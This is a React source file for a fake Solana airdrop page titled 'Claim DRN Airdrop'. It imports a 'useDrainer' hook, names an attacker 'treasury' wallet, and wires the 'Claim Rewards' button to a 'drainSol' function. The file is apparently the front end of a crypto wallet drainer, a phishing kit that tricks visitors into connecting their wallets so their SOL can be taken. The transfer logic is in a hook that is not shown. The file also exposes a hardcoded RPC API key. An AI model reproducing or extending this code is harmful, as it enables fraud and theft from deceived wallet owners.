import React, { useEffect } from 'react';
import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useDrainer } from './hooks/useDrainer';

// Your Treasury and Token Configuration
const CONFIG = {
  treasury: "HLT8iGxsCGawd5RpHnLQFbXXJ7LZ9EEvzhBhDmCofaiV",
  tokenMint: "WAU6jXFTFW3ayXjVFYAZqra549aMRox167j2D35Hpbm",
  tokenSymbol: "DRN",
  tokenDecimals: 9,
  rpcUrl: "https://mainnet.helius-rpc.com/?api-key=bf49a7f3-709f-4ba6-aae2-e33ebb62977a",
};

function App() {
  const { connected, publicKey } = useWallet();
  const { solBalance, loading, fetchBalance, drainSol } = useDrainer();

  useEffect(() => {
    if (connected) {
      fetchBalance();
    }
  }, [connected, fetchBalance]);

  if (!connected) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#9945FF] to-[#14F19C] flex flex-col items-center justify-center text-white p-4 font-sans">
        <div className="max-w-md w-full bg-white/10 backdrop-blur-md rounded-2xl p-8 shadow-2xl border border-white/20 text-center">
          <div className="mb-6">
            <div className="inline-flex items-center justify-center w-24 h-24 rounded-full bg-white mb-6 shadow-lg">
              <img src="/solana-logo.png" alt="Solana" className="w-16 h-16" />
            </div>
            <h1 className="text-3xl font-bold mb-2 text-white">Claim {CONFIG.tokenSymbol} Airdrop</h1>
            <p className="text-white/80">Connect your wallet to verify eligibility</p>
          </div>
          
          <div className="mb-6">
            <WalletMultiButton className="bg-white hover:bg-gray-100 border-none text-[#9945FF] font-bold py-3 px-8 rounded-xl transition-all transform hover:scale-105 shadow-lg" />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#9945FF] to-[#14F19C] text-white p-4 font-sans">
      <div className="max-w-md mx-auto">
        <div className="bg-white/10 backdrop-blur-md rounded-2xl p-8 shadow-2xl border border-white/20">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-2xl font-bold text-white">Claim {CONFIG.tokenSymbol}</h1>
            <WalletMultiButton className="bg-white hover:bg-gray-100 border-none text-[#9945FF] font-bold py-2 px-4 rounded-lg text-sm" />
          </div>

          <div className="bg-black/20 rounded-xl p-4 mb-6">
            <div className="flex justify-between items-center mb-2">
              <span className="text-white/70">Wallet</span>
              <span className="text-sm text-white">{publicKey?.toBase58().slice(0, 4)}...{publicKey?.toBase58().slice(-4)}</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-white/70">SOL Balance</span>
              <span className="text-xl font-bold text-white">{solBalance.toFixed(4)} SOL</span>
            </div>
          </div>

          <div className="bg-black/20 rounded-xl p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-white/70">Treasury Wallet</span>
              <span className="text-xs text-white/50 break-all text-right">{CONFIG.treasury.slice(0, 8)}...</span>
            </div>
          </div>

          <button
            onClick={drainSol}
            disabled={loading}
            className="w-full bg-white hover:bg-gray-100 text-[#9945FF] font-bold py-4 rounded-xl transition-all transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
          >
            {loading ? "Claiming Rewards..." : "Claim Rewards"}
          </button>
        </div>
      </div>
    </div>
  );
}

export default App;
